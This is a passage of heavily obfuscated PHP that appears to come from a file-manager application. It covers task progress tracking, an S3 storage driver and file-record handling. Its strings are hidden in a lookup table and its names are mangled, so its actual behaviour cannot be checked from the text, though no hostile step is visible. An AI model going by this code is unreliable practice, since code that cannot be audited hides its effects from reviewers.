$® Έ΄Το; } private static function valueSet($’ξλ›ΪΦ, $β΅Ε°Σμ = false) { $Ω†χΰ„ =& $_SERVER[γγάψ½]; $οπΒ¬€ = $Ω†χΰ„[1791]; CacheLock::lock($οπΒ¬€); $²ά©ρ» = Model($Ω†χΰ„[511])->set($’ξλ›ΪΦ, $β΅Ε°Σμ, $Ω†χΰ„[1790]); CacheLock::unlock($οπΒ¬€); return $²ά©ρ»; } protected static function log($²Πη¥ΕΜ) { write_log($²Πη¥ΕΜ, $_SERVER[γγάψ½][1776]); } private static function cacheClear() { $ΌΥ¦ΉΝ• =& $_SERVER[γγάψ½]; Cache::clearMemory(Model($ΌΥ¦ΉΝ•[511])->cacheKey($ΌΥ¦ΉΝ•[1790])); Cache::clearMemory(Model($ΌΥ¦ΉΝ•[511])->cacheKey($ΌΥ¦ΉΝ•[1792])); Model($ΌΥ¦ΉΝ•[1761])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\x6f\160"; const STATYS_RUNNING = "\162\165\x6e\x6e\151\x6e\147"; const STATYS_KILL = "\153\x69\x6c\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($Ώ«ΰφ¦’, $¦ο€ = '', $ΧφέΛΊ = 0, $Χ™ΎΥ = '') { $¨Η € =& $_SERVER[γγάψ½]; if (self::get($Ώ«ΰφ¦’)) { return; } $this->task = array($¨Η €[478] => $Ώ«ΰφ¦’, $¨Η €[1793] => USER_ID, $¨Η €[1679] => $Χ™ΎΥ, $¨Η €[529] => $¨Η €[12], $¨Η €[33] => $¦ο€, $¨Η €[1151] => $¨Η €[12], $¨Η €[1149] => $ΧφέΛΊ, $¨Η €[1794] => 0, $¨Η €[1795] => 0, $¨Η €[1796] => 0, $¨Η €[1797] => timeFloat(), $¨Η €[1798] => 0, $¨Η €[1799] => 0, $¨Η €[1800] => 0, $¨Η €[1801] => 0, $¨Η €[825] => $¨Η €[1742]); $GLOBALS[$¨Η €[1802]] = 1; Hook::bind($¨Η €[1746], array($this, $¨Η €[1803])); Hook::bind($¨Η €[1804], array($this, $¨Η €[1805])); $this->startAfter(); Hook::trigger($¨Η €[1806], $this->task); $this->task[$¨Η €[1799]] = timeFloat(); } public function end($ΨβΩΎ­ = '') { $Όφ®Ζ =& $_SERVER[γγάψ½]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$Όφ®Ζ[1799]]) { self::valueSet($this->task[$Όφ®Ζ[478]], !1); } $this->isEnd = !0; if ($ΨβΩΎ­) { $this->task[$Όφ®Ζ[529]] = $ΨβΩΎ­; } self::log($Όφ®Ζ[1807] . $this->task[$Όφ®Ζ[478]] . $Όφ®Ζ[1808] . sprintf($Όφ®Ζ[932], timeFloat() - $this->task[$Όφ®Ζ[1797]]) . $Όφ®Ζ[1809]); Hook::unbind($Όφ®Ζ[1746], array($this, $Όφ®Ζ[1803])); Hook::unbind($Όφ®Ζ[1804], array($this, $Όφ®Ζ[1805])); $this->endAfter(); $τΔ¶Α = $this->task; $this->task = !1; Hook::trigger($Όφ®Ζ[1810], $τΔ¶Α); } public function update($Ό¶¥όΙ = 0, $ΊΆ σ¨° = false) { $ΚΜ±ό =& $_SERVER[γγάψ½]; $–μκ®— =& $this->task; if (!$–μκ®—) { return; } $–μκ®—[$ΚΜ±ό[1794]] += $Ό¶¥όΙ; $–μκ®—[$ΚΜ±ό[1798]] = timeFloat(); if ($–μκ®—[$ΚΜ±ό[1149]]) { if ($–μκ®—[$ΚΜ±ό[1149]] < $–μκ®—[$ΚΜ±ό[1794]]) { $–μκ®—[$ΚΜ±ό[1149]] = $–μκ®—[$ΚΜ±ό[1794]]; } $‹Ώ°¨ΩΖ = timeFloat() - $–μκ®—[$ΚΜ±ό[1797]] - $–μκ®—[$ΚΜ±ό[1800]]; if ($‹Ώ°¨ΩΖ <= 0) { $‹Ώ°¨ΩΖ = 0.001; } $–μκ®—[$ΚΜ±ό[1795]] = $–μκ®—[$ΚΜ±ό[1794]] / $–μκ®—[$ΚΜ±ό[1149]]; $–μκ®—[$ΚΜ±ό[1796]] = $–μκ®—[$ΚΜ±ό[1794]] / $‹Ώ°¨ΩΖ; if ($–μκ®—[$ΚΜ±ό[1795]] > 0) { $–μκ®—[$ΚΜ±ό[1801]] = $‹Ώ°¨ΩΖ * (1 - $–μκ®—[$ΚΜ±ό[1795]]) / $–μκ®—[$ΚΜ±ό[1795]]; } $–μκ®—[$ΚΜ±ό[1801]] = $–μκ®—[$ΚΜ±ό[1801]] <= 0 ? 0 : $–μκ®—[$ΚΜ±ό[1801]]; } $this->updateAfter(); $πλΡ΅ = 0.2; if (timeFloat() - $–μκ®—[$ΚΜ±ό[1799]] < $πλΡ΅ && !$ΊΆ σ¨°) { return; } $ΊνΧΞ±“ = self::get($–μκ®—[$ΚΜ±ό[478]]); $―’£ = $ΊνΧΞ±“[$ΚΜ±ό[825]]; if ($―’£ == self::STATYS_KILL) { $ΞΘ³ρω΄ = array($ΚΜ±ό[1811] => LNG($ΚΜ±ό[1812]), $ΚΜ±ό[1308] => !1); Cache::set($ΚΜ±ό[1813] . $this->task[$ΚΜ±ό[478]], $ΞΘ³ρω΄, 30); $this->onKill(); $this->end(); die; } else { if ($―’£ == self::STATYS_STOP) { $΅η–µ = 2; $ΊνΧΞ±“[$ΚΜ±ό[1800]] += $΅η–µ; self::valueSet($–μκ®—[$ΚΜ±ό[478]], $ΊνΧΞ±“); sleep($΅η–µ); $this->update(); return; } } $–μκ®—[$ΚΜ±ό[825]] = $―’£ ? $―’£ : $–μκ®—[$ΚΜ±ό[825]]; $–μκ®—[$ΚΜ±ό[1800]] = $ΊνΧΞ±“[$ΚΜ±ό[1800]] ? $ΊνΧΞ±“[$ΚΜ±ό[1800]] : 0; $–μκ®—[$ΚΜ±ό[1799]] = timeFloat(); Hook::trigger($ΚΜ±ό[1814], $–μκ®—); self::valueSet($–μκ®—[$ΚΜ±ό[478]], $–μκ®—); } public function onKillSet($’οΛΎώή, $ζ²πά« = array()) { $this->onKillCall = array($’οΛΎώή, $ζ²πά«); } public function onKill() { $“½ΥΟσή =& $_SERVER[γγάψ½]; self::log($“½ΥΟσή[1807] . $this->task[$“½ΥΟσή[478]] . $“½ΥΟσή[1815]); Hook::trigger($“½ΥΟσή[1816], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Ε΅εΗέ§) { $—‘ψέ =& $_SERVER[γγάψ½]; Cache::set($—‘ψέ[1813] . $this->task[$—‘ψέ[478]], $Ε΅εΗέ§, 60); if (!is_array($Ε΅εΗέ§) || !$Ε΅εΗέ§[$—‘ψέ[1308]]) { self::log($—‘ψέ[1817] . json_encode($Ε΅εΗέ§)); } return $Ε΅εΗέ§; } public static function get($³Χ­°­) { $ώ΄ψρ =& $_SERVER[γγάψ½]; $­ƒ‹”ρ¬ = self::valueGet($³Χ­°­); if (is_array($­ƒ‹”ρ¬) && $­ƒ‹”ρ¬[$ώ΄ψρ[1818]]) { $·σ΄™ = ActionApply($­ƒ‹”ρ¬[$ώ΄ψρ[1818]], array($­ƒ‹”ρ¬)); $­ƒ‹”ρ¬ = is_array($·σ΄™) ? $·σ΄™ : $­ƒ‹”ρ¬; } return $­ƒ‹”ρ¬; } public static function listData() { $΅έΘέΌ« = self::valueGet(); return array_sort_by($΅έΘέΌ«, $_SERVER[γγάψ½][1797], !0); } public static function kill($θΟΊΧΒ) { return self::changeStatus($θΟΊΧΒ, self::STATYS_KILL); } public static function stop($·ΦΨ¨±) { return self::changeStatus($·ΦΨ¨±, self::STATYS_STOP); } public static function restart($‘¤£§¨) { return self::changeStatus($‘¤£§¨, self::STATYS_RUNNING); } public static function killAll() { $Άς£‹Β =& $_SERVER[γγάψ½]; $Φγ½™‘ = self::listData(); foreach ($Φγ½™‘ as $…©Ε΅Έ) { self::kill($…©Ε΅Έ[$Άς£‹Β[478]]); } sleep(2); foreach ($Φγ½™‘ as $…©Ε΅Έ) { self::valueSet($…©Ε΅Έ[$Άς£‹Β[478]], !1); } } private static function changeStatus($εΞ―‰¤•, $ΦΥΪ„δβ) { $™ΗΦΔΔ’ =& $_SERVER[γγάψ½]; $Δ Χ±ρϋ = self::valueGet($εΞ―‰¤•); if (!$Δ Χ±ρϋ) { return !1; } $Δ Χ±ρϋ[$™ΗΦΔΔ’[825]] = $ΦΥΪ„δβ; self::valueSet($εΞ―‰¤•, $Δ Χ±ρϋ); self::log($™ΗΦΔΔ’[1819] . $Δ Χ±ρϋ[$™ΗΦΔΔ’[478]] . $™ΗΦΔΔ’[1820] . $ΦΥΪ„δβ); return !0; } public static function valueGet($Λ²Ϋνπ = false) { $¤®¨Β¨ =& $_SERVER[γγάψ½]; if ($Λ²Ϋνπ) { $£΄¶ΧΙΑ = Model($¤®¨Β¨[523])->where(array($¤®¨Β¨[97] => $Λ²Ϋνπ, $¤®¨Β¨[33] => $¤®¨Β¨[1158]))->find(); return $£΄¶ΧΙΑ ? json_decode($£΄¶ΧΙΑ[$¤®¨Β¨[453]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ςορ = false) { $ο¥λΑΓσ =& $_SERVER[γγάψ½]; $Υ όΓ  = array($ο¥λΑΓσ[33] => $ο¥λΑΓσ[1158]); if ($ςορ) { $Υ όΓ [$ο¥λΑΓσ[1793]] = $ςορ; } $…ΐ΄Ι’Ά = Model($ο¥λΑΓσ[523])->where($Υ όΓ )->select(); $…ΐ΄Ι’Ά = $…ΐ΄Ι’Ά ? $…ΐ΄Ι’Ά : array(); foreach ($…ΐ΄Ι’Ά as $–Νβτ–ω => $ΆσΑΓγ§) { $…ΐ΄Ι’Ά[$–Νβτ–ω] = json_decode($ΆσΑΓγ§[$ο¥λΑΓσ[453]], !0); } return $…ΐ΄Ι’Ά; } public static function valueSet($ΩΈΪΗ , $ΦΩΡ°) { $¤‚Ί =& $_SERVER[γγάψ½]; if (!$ΦΩΡ°) { return Model($¤‚Ί[523])->where(array($¤‚Ί[97] => $ΩΈΪΗ , $¤‚Ί[33] => $¤‚Ί[1158]))->delete(); } $κΎήΔψΠ = json_encode($ΦΩΡ°); if (!$κΎήΔψΠ) { ob_start(); var_dump($ΦΩΡ°); $ε·Ϋ¶Ά = ob_get_clean(); self::log($¤‚Ί[1821] . json_encode_force($ε·Ϋ¶Ά)); } if (!$ΩΈΪΗ  || !$ΦΩΡ°[$¤‚Ί[478]]) { return !1; } $ύςυ•ΐ = array($¤‚Ί[33] => $¤‚Ί[1158], $¤‚Ί[1793] => USER_ID, $¤‚Ί[97] => $ΩΈΪΗ , $¤‚Ί[453] => $κΎήΔψΠ); $‡ΙφΦ§Ξ = $¤‚Ί[1822]; CacheLock::lock($‡ΙφΦ§Ξ); Model($¤‚Ί[523])->add($ύςυ•ΐ, array(), !0); CacheLock::unlock($‡ΙφΦ§Ξ); } public static function log($΄μήζΧΌ) { if (!GLOBAL_DEBUG) { return; } write_log($΄μήζΧΌ, $_SERVER[γγάψ½][1823]); } } goto Fν¤Ω·¥”; AΩιƒΒρ¨: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($οΰΘέ½) { $“ηζ– =& $_SERVER[γγάψ½]; parent::__construct($οΰΘέ½); $α•£Ήί = isset($οΰΘέ½[$“ηζ–[259]]) && $οΰΘέ½[$“ηζ–[259]] == $“ηζ–[250] ? $“ηζ–[250] : $“ηζ–[316]; $this->setSignVersion($α•£Ήί); } public function link($γϊΐ , $ψ½ = array()) { return parent::link($γϊΐ , $ψ½); } public function fileOut($µ™ΓΝΘ¦, $¶ΕΟ†Ι΄ = false, $±ΐ¶ΫΙΏ = false, $Θ’ΒΗ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[γγάψ½][317])) { return parent::fileOutServer($µ™ΓΝΘ¦, $¶ΕΟ†Ι΄, $±ΐ¶ΫΙΏ, $Θ’ΒΗ); } parent::fileOut($µ™ΓΝΘ¦, $¶ΕΟ†Ι΄, $±ΐ¶ΫΙΏ, $Θ’ΒΗ); } public function fileOutImage($βΟƒ‘ζ, $ξΏυΒΡ = 250) { if (strstr($this->endpoint, $_SERVER[γγάψ½][317])) { return parent::fileOutImageServer($βΟƒ‘ζ, $ξΏυΒΡ); } parent::fileOutImage($βΟƒ‘ζ, $ξΏυΒΡ); } } define($_SERVER[γγάψ½][318], 1); define($_SERVER[γγάψ½][319], 2); goto F‘±ιΔΏ½…; D ΟΚ¨Έ–¨: class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\x66\151\x6c\x65"; protected $tableMeta = array("\164\141\142\x6c\145\x4e\x61\x6d\145" => "\151\x6f\x5f\146\151\154\145\x5f\x6d\145\x74\x61", "\x6d\145\164\x61\x46\151\145\x6c\x64" => "\x66\x69\x6c\x65\x49\x44"); public function fileInfo($ψϋ’³„Σ) { $ξόδ½ψΒ =& $_SERVER[γγάψ½]; static $ό„ύζΩ = array(); if (!isset($ό„ύζΩ[$ψϋ’³„Σ])) { $ΪΘΓ®€μ = $ξόδ½ψΒ[2043]; $ΗζύΠΖ = Model($ξόδ½ψΒ[549])->field($ΪΘΓ®€μ)->where(array($ξόδ½ψΒ[547] => $ψϋ’³„Σ))->find(); $ό„ύζΩ[$ψϋ’³„Σ] = $ΗζύΠΖ; } return $ό„ύζΩ[$ψϋ’³„Σ]; } public function addFileByContent($«ΌΑΣ¦ = '', $Σ±ΔΚέ, $£Ύ—¶ = '') { $ιΨη¤„ =& $_SERVER[γγάψ½]; $μω¶™ƒ = TEMP_PATH . $ιΨη¤„[2044]; if (!is_dir($μω¶™ƒ)) { mk_dir($μω¶™ƒ); } $‘‡ώΕ = $μω¶™ƒ . $ιΨη¤„[2045] . rand_string(16); $¦‚·ΡΌ = file_put_contents($‘‡ώΕ, $«ΌΑΣ¦); if ($¦‚·ΡΌ === !1 || strlen($«ΌΑΣ¦) != $¦‚·ΡΌ) { return !1; } $Θκ£ΆΈƒ = $this->addFile($‘‡ώΕ, $Σ±ΔΚέ, $£Ύ—¶, !0); if (file_exists($‘‡ώΕ)) { @unlink($‘‡ώΕ); } return $Θκ£ΆΈƒ; } public function createFileName($Π€–’Έ, $£¨Υχβν, $ΖεΩΟΗ = false, $ΰ°·Μ– = false) { $κ‰‹†Λ =& $_SERVER[γγάψ½]; $‹Ά”›¦ζ = IO::init($κ‰‹†Λ[8]); $ινΝƒ = $this->_makeFilePath($Π€–’Έ, $£¨Υχβν, $‹Ά”›¦ζ, $ΖεΩΟΗ, $ΰ°·Μ–); $‹ΏϊΉΆ„ = $‹Ά”›¦ζ->pathFather($ινΝƒ); static $ψΔΙή« = false; $ƒ›νΤµ = $κ‰‹†Λ[2046] . md5($‹ΏϊΉΆ„); if (!$ψΔΙή« && !Cache::get($ƒ›νΤµ)) { $ψΔΙή« = !0; $Ά΅•θ–λ = IO::mkdir($‹ΏϊΉΆ„); if (!IO::exist($Ά΅•θ–λ . $κ‰‹†Λ[874])) { IO::mkfile($Ά΅•θ–λ . $κ‰‹†Λ[874]); } Cache::set($ƒ›νΤµ, 1, 3600 * 2); } return $ινΝƒ; } public function _makeFilePath($ΫΚ®‡‡, $ίΧ½ψΖΧ, $«μώσΗ, $²»Π³Τ = false, $ΖΨς¨»† = false) { $λ›Ύύ =& $_SERVER[γγάψ½]; $ΜΣ¥τΰ¨ = Model($λ›Ύύ[845])->get($λ›Ύύ[2047]); $Ί΄βδΆ = $λ›Ύύ[1333] . $ίΧ½ψΖΧ[$λ›Ύύ[478]] . $λ›Ύύ[487] . date($λ›Ύύ[2048]); $ΪΗκ”ƒƒ = $Ί΄βδΆ . rand_string(5) . short_id(100); $ΫΚ®‡‡ = str_replace($λ›Ύύ[8], $λ›Ύύ[11], KodIO::clear($ΫΚ®‡‡)); $…©Ψ•™ = $«μώσΗ->ext($ΫΚ®‡‡); if (!$ΫΚ®‡‡) { $ΜΣ¥τΰ¨ = $λ›Ύύ[851]; } switch ($ΜΣ¥τΰ¨) { case $λ›Ύύ[2049]: if ($…©Ψ•™) { $ΪΗκ”ƒƒ = $ΪΗκ”ƒƒ . $λ›Ύύ[10] . $…©Ψ•™; } if ($…©Ψ•™ == $λ›Ύύ[1986]) { $ΪΗκ”ƒƒ .= $λ›Ύύ[1302]; } break; case $λ›Ύύ[2050]: $¨ρΔϋΜ = Model($λ›Ύύ[845])->get($λ›Ύύ[846]); $π³„‘³π = substr(md5($λ›Ύύ[847] . $¨ρΔϋΜ . date($λ›Ύύ[824])), 0, 8); $Ί΄βδΆ = $λ›Ύύ[1333] . $ίΧ½ψΖΧ[$λ›Ύύ[478]] . $λ›Ύύ[487] . date($λ›Ύύ[2051]) . $π³„‘³π . $λ›Ύύ[8]; if ($…©Ψ•™ == $λ›Ύύ[1986]) { $ΫΚ®‡‡ .= $λ›Ύύ[1302]; } $‰ιΉώΐο = $λ›Ύύ[2052] . $Ί΄βδΆ . $ΫΚ®‡‡; CacheLock::lock($‰ιΉώΐο); $ΪΗκ”ƒƒ = $Ί΄βδΆ . $ΫΚ®‡‡; if (IO::exist($Ί΄βδΆ . $ΫΚ®‡‡)) { $™°ΐ―«Ο = substr($ΫΚ®‡‡, 0, strlen($ΫΚ®‡‡) - strlen($…©Ψ•™)); $Τ†ΊΖϊψ = $ΖΨς¨»† ? substr($ΖΨς¨»†, 0, 5) : ($²»Π³Τ ? substr($²»Π³Τ, 0, 5) : rand_string(5)); $ΪΗκ”ƒƒ = $Ί΄βδΆ . $™°ΐ―«Ο . $Τ†ΊΖϊψ; if ($…©Ψ•™) { $ΪΗκ”ƒƒ = $ΪΗκ”ƒƒ . $λ›Ύύ[10] . $…©Ψ•™; } } if (IO::isOsDriver($ΪΗκ”ƒƒ) && !IO::isUploadServer($ΪΗκ”ƒƒ)) { if (IO::exist($ΪΗκ”ƒƒ)) { CacheLock::unlock($‰ιΉώΐο); return $ΪΗκ”ƒƒ; } $‚¤ϊ΅΄ = IO::setContent($ΪΗκ”ƒƒ, $λ›Ύύ[12]); if (!$‚¤ϊ΅΄) { show_json($λ›Ύύ[2053], !1); } } CacheLock::unlock($‰ιΉώΐο); break; case $λ›Ύύ[851]: break; default: break; } return $ΪΗκ”ƒƒ; } public function addFileByRemote($µο°¤Κτ, $›ΌΠΦ, $Ώλ†Ξ§δ = array()) { $ƒ‰ό°Σ =& $_SERVER[γγάψ½]; if (!IO::exist($µο°¤Κτ)) { return !1; } $±¶”φ = $Ώλ†Ξ§δ[$ƒ‰ό°Σ[552]] ? $Ώλ†Ξ§δ[$ƒ‰ό°Σ[552]] : $ƒ‰ό°Σ[12]; $Ί£Πυ = IO::hashMd5($µο°¤Κτ, $±¶”φ); $ΆΠ—®±Λ = KodIO::parse($µο°¤Κτ); $Άν‚¥σ = array($ƒ‰ό°Σ[625] => IO::size($µο°¤Κτ), $ƒ‰ό°Σ[2054] => 1, $ƒ‰ό°Σ[497] => $›ΌΠΦ, $ƒ‰ό°Σ[888] => $ΆΠ—®±Λ[$ƒ‰ό°Σ[478]], $ƒ‰ό°Σ[498] => $µο°¤Κτ, $ƒ‰ό°Σ[2055] => $Ώλ†Ξ§δ[$ƒ‰ό°Σ[680]] ? $Ώλ†Ξ§δ[$ƒ‰ό°Σ[680]] : IO::hashSimple($µο°¤Κτ), $ƒ‰ό°Σ[2056] => $Ί£Πυ ? $Ί£Πυ : $±¶”φ); if ($νµο¤έ = $this->addFileCheckExist($Άν‚¥σ[$ƒ‰ό°Σ[680]], $Άν‚¥σ[$ƒ‰ό°Σ[552]], $Άν‚¥σ[$ƒ‰ό°Σ[79]])) { return $νµο¤έ; } return $this->addFileData($Άν‚¥σ); } private function addFileData($Ό‰τΐƒ°) { $ώ‡Ό±› =& $_SERVER[γγάψ½]; if (!$Ό‰τΐƒ°) { return !1; } $Ό‰τΐƒ°[$ώ‡Ό±›[79]] = intval($Ό‰τΐƒ°[$ώ‡Ό±›[79]]); if (!$Ό‰τΐƒ°[$ώ‡Ό±›[79]] && strlen($Ό‰τΐƒ°[$ώ‡Ό±›[680]]) > 32) { $Ό‰τΐƒ°[$ώ‡Ό±›[79]] = intval(substr($Ό‰τΐƒ°[$ώ‡Ό±›[680]], 32)); } $ΖΟί‘² = $this->add($Ό‰τΐƒ°); return $this->find($ΖΟί‘²); } public function addFile($Βρ£Νή, $Ξ΄½¬, $Η¤Σ λΣ, $‚ψέξ = false) { $βΩ‡α–… =& $_SERVER[γγάψ½]; $πς Β½Ω = IO::hashSimple($Βρ£Νή); $α―²όρ = IO::size($Βρ£Νή); $ύΝβ‚ = $α―²όρ <= 1024 * 1024 * 10 ? IO::hashMd5($Βρ£Νή) : $βΩ‡α–…[12]; $‚λ¤ωβ = $βΩ‡α–…[2057] . $πς Β½Ω; CacheLock::lock($‚λ¤ωβ); if ($ύΝβ‚ && $πς Β½Ω) { $ήΔΩυΤ = $this->addFileCheckExist($πς Β½Ω, $ύΝβ‚, $α―²όρ); if ($ήΔΩυΤ) { CacheLock::unlock($‚λ¤ωβ); return $ήΔΩυΤ; } } $£ΣΝ½δ = $this->addFileMake($Βρ£Νή, $Ξ΄½¬, $α―²όρ, $πς Β½Ω, $ύΝβ‚, $Η¤Σ λΣ, $‚ψέξ); $χ΅©Κ = $this->addFileData($£ΣΝ½δ); if (!$χ΅©Κ) { return !1; } CacheLock::unlock($‚λ¤ωβ); if (!$ύΝβ‚ && $χ΅©Κ) { $this->fileMd5Check($χ΅©Κ); } return $χ΅©Κ; } public function fileMd5Check($«άΧ³–’) { $‡Ήυήί =& $_SERVER[γγάψ½]; $χΪƒ’£ = array($«άΧ³–’[$‡Ήυήί[546]], $«άΧ³–’[$‡Ήυήί[87]]); $Ύ¤Θ—™ = $‡Ήυήί[2058] . $«άΧ³–’[$‡Ήυήί[87]]; $•‚‘ν³Ώ = $‡Ήυήί[2059] . $«άΧ³–’[$‡Ήυήί[546]]; TaskQueue::add($‡Ήυήί[2060], $χΪƒ’£, $Ύ¤Θ—™, $•‚‘ν³Ώ); } public function fileMd5Set($τ–Υ¦ζΞ, $ΚΨΡ) { $“Κ―Η =& $_SERVER[γγάψ½]; $νε‘λƒ = $this->find($τ–Υ¦ζΞ); if (!$νε‘λƒ || $νε‘λƒ[$“Κ―Η[552]]) { return; } $ ¨ΘΚγ = IO::hashMd5($ΚΨΡ); if (!$ ¨ΘΚγ) { return $“Κ―Η[12]; } $this->where(array($“Κ―Η[546] => $τ–Υ¦ζΞ))->save(array($“Κ―Η[552] => $ ¨ΘΚγ)); } public function addFileMake($Ζ¨―π·, $€ΗήΟ€ , $ϋΡΎ…Ί, $ΓΥκΝ…, $ξ£¨ΰ‹ , $ύωΪγ§§, $–€Ζ‚Ώΰ) { $ΐή£¨ΐ =& $_SERVER[γγάψ½]; $Σ¶ό…§ = $this->createFileName($ύωΪγ§§, $€ΗήΟ€ , $ΓΥκΝ…, $ξ£¨ΰ‹ ); $¦ςΉΜΕ· = get_path_father($Σ¶ό…§); $ΟΑφϋ = get_path_this($Σ¶ό…§); if ($–€Ζ‚Ώΰ) { $ι²Βυ¬ = IO::move($Ζ¨―π·, $¦ςΉΜΕ·, !1, $ΟΑφϋ); } else { $ι²Βυ¬ = IO::copy($Ζ¨―π·, $¦ςΉΜΕ·, !1, $ΟΑφϋ); } if (!$ι²Βυ¬) { return !1; } $µΔιΟΦ½ = IO::init($ι²Βυ¬); $µΔιΟΦ½->cacheMethod($ΐή£¨ΐ[182], $µΔιΟΦ½->path, $ΐή£¨ΐ[179]); if (IO::size($ι²Βυ¬) != $ϋΡΎ…Ί) { return !1; } $α™°¤“ή = array($ΐή£¨ΐ[625] => $ϋΡΎ…Ί, $ΐή£¨ΐ[2054] => 1, $ΐή£¨ΐ[497] => $ύωΪγ§§, $ΐή£¨ΐ[888] => $€ΗήΟ€ [$ΐή£¨ΐ[478]], $ΐή£¨ΐ[498] => $Σ¶ό…§, $ΐή£¨ΐ[2055] => $ΓΥκΝ…, $ΐή£¨ΐ[2056] => $ξ£¨ΰ‹ ); return $α™°¤“ή; } public function addFileCheckExist($ζΗ‹ΖιΫ, $Ξ¤¬²κ, $¤ƒ†³Βψ) { $“ϊ™ε³ =& $_SERVER[γγάψ½]; $ΖΏ§€ = $this->findByHash($ζΗ‹ΖιΫ, $Ξ¤¬²κ); if (!$ΖΏ§€) { return !1; } $δ“™‰Γώ = array($“ϊ™ε³[2054] => intval($ΖΏ§€[$“ϊ™ε³[2061]]) + 1, $“ϊ™ε³[625] => $¤ƒ†³Βψ); $this->where(array($“ϊ™ε³[547] => $ΖΏ§€[$“ϊ™ε³[546]]))->save($δ“™‰Γώ); return $ΖΏ§€; } public function remove($ΞΘµψ) { $this->linkCountChange($ΞΘµψ, !1); $this->clearEmpty(); return !0; } public function linkAdd($Έ³›ΕΞ) { $this->linkCountChange($Έ³›ΕΞ, !0); } public function linkCountChange($η¥±φ¤, $‰εΒ›ψΪ) { $ϋγ·ν”‚ =& $_SERVER[γγάψ½]; if (!$η¥±φ¤) { return; } if (!is_array($η¥±φ¤)) { $η¥±φ¤ = array($η¥±φ¤); } $μΤσϋ΅‡ = array(); foreach ($η¥±φ¤ as $‰Ο‰―Π) { $όΛκ†¥υ = $‰Ο‰―Π . $ϋγ·ν”‚[12]; if (!$μΤσϋ΅‡[$όΛκ†¥υ]) { $μΤσϋ΅‡[$όΛκ†¥υ] = 0; } $μΤσϋ΅‡[$όΛκ†¥υ]++; } $ήµ‘τ = array(); foreach ($μΤσϋ΅‡ as $‰Ο‰―Π => $¨Ά®…ωΰ) { $όΛκ†¥υ = $¨Ά®…ωΰ . $ϋγ·ν”‚[12]; if (!$ήµ‘τ[$όΛκ†¥υ]) { $ήµ‘τ[$όΛκ†¥υ] = array(); } $ήµ‘τ[$όΛκ†¥υ][] = $‰Ο‰―Π; } foreach ($ήµ‘τ as $¨Ά®…ωΰ => $ΨαΨ›φ) { if (!$ΨαΨ›φ) { continue; } $¨Ά®…ωΰ = $‰εΒ›ψΪ ? $¨Ά®…ωΰ : -intval($¨Ά®…ωΰ); $¨ό„φΝζ = array($ϋγ·ν”‚[546] => array($ϋγ·ν”‚[7], $ΨαΨ›φ)); if ($¨Ά®…ωΰ < 0) { $¨ό„φΝζ[$ϋγ·ν”‚[2061]] = array($ϋγ·ν”‚[1101], abs($¨Ά®…ωΰ)); } $this->where($¨ό„φΝζ)->setAdd($ϋγ·ν”‚[2061], $¨Ά®…ωΰ); } } public function findByHash($¥ΛβΧΕΧ, $’κχ°Τ‚ = false) { $‚ΕΉΨΙΫ =& $_SERVER[γγάψ½]; if (!$¥ΛβΧΕΧ && !$’κχ°Τ‚) { return !1; } $ΜΒΚ―νί = array($‚ΕΉΨΙΫ[2055] => $¥ΛβΧΕΧ); if ($’κχ°Τ‚) { $ΜΒΚ―νί = array($‚ΕΉΨΙΫ[2056] => $’κχ°Τ‚); } return $this->order($‚ΕΉΨΙΫ[2062])->where($ΜΒΚ―νί)->find(); } public function clearEmpty($ΜδΠΧήώ = 1) { $μϊ΄²± =& $_SERVER[γγάψ½]; $ΤΝ¦Χ¥ = time() - 3600 * 24 * $ΜδΠΧήώ; $Οη΅ώλΫ = $μϊ΄²±[2063] . $ΤΝ¦Χ¥; $χΈΤ― = $this->where($Οη΅ώλΫ)->select(); if (!$χΈΤ―) { return; } $λΈύωύΠ = new Task($μϊ΄²±[2064], $μϊ΄²±[12], count($χΈΤ―)); foreach ($χΈΤ― as $Ύ―ϋόϋ) { $λΈύωύΠ->update(1); $this->resetFile($Ύ―ϋόϋ); } $λΈύωύΠ->end(); } public function resetFile($ ύψΨ) { $Ψ®ο³ΉΞ =& $_SERVER[γγάψ½]; $έήδξγ„ = array($Ψ®ο³ΉΞ[547] => $ ύψΨ[$Ψ®ο³ΉΞ[546]]); $χ£φν = Model($Ψ®ο³ΉΞ[1439])->where($έήδξγ„)->count(); $ψα«΅τ = Model($Ψ®ο³ΉΞ[2065])->where($έήδξγ„)->count(); $½›ΏβΕΖ = intval($χ£φν) + intval($ψα«΅τ); if ($½›ΏβΕΖ == 0) { IO::remove($ ύψΨ[$Ψ®ο³ΉΞ[87]]); Model($Ψ®ο³ΉΞ[2066])->delete($ ύψΨ[$Ψ®ο³ΉΞ[546]]); $this->where($έήδξγ„)->delete(); $this->metaSet($ ύψΨ[$Ψ®ο³ΉΞ[546]], null, null); write_log(ACTION . $Ψ®ο³ΉΞ[2067] . KodUser::id() . $Ψ®ο³ΉΞ[2068] . $ ύψΨ[$Ψ®ο³ΉΞ[546]] . $Ψ®ο³ΉΞ[2069] . $ ύψΨ[$Ψ®ο³ΉΞ[79]] . $Ψ®ο³ΉΞ[202] . $ ύψΨ[$Ψ®ο³ΉΞ[87]], $Ψ®ο³ΉΞ[2070]); return; } if ($ ύψΨ[$Ψ®ο³ΉΞ[2061]] != $½›ΏβΕΖ) { $this->where($έήδξγ„)->save(array($Ψ®ο³ΉΞ[2054] => $½›ΏβΕΖ)); } } public function storageInfo($ΡόΌγ©λ = false) { $ϊΟ™ζ·Β =& $_SERVER[γγάψ½]; $χκεΈ»λ = $this->count() + 0.0; $‡§θƒ = 0; $Ή½²Ή¥ = 1; $€•Φ—Φκ = 0; $ΰ¦εΙυ = 5000; for ($¤πψζ = 0; $¤πψζ < $χκεΈ»λ; $¤πψζ = $¤πψζ + $ΰ¦εΙυ) { $Ξ…£µ¨Ή = $this->limit($¤πψζ, $¤πψζ + $ΰ¦εΙυ)->select(); foreach ($Ξ…£µ¨Ή as $ΓΞΞΪρΞ) { $Ή½²Ή¥ += $ΓΞΞΪρΞ[$ϊΟ™ζ·Β[79]] * 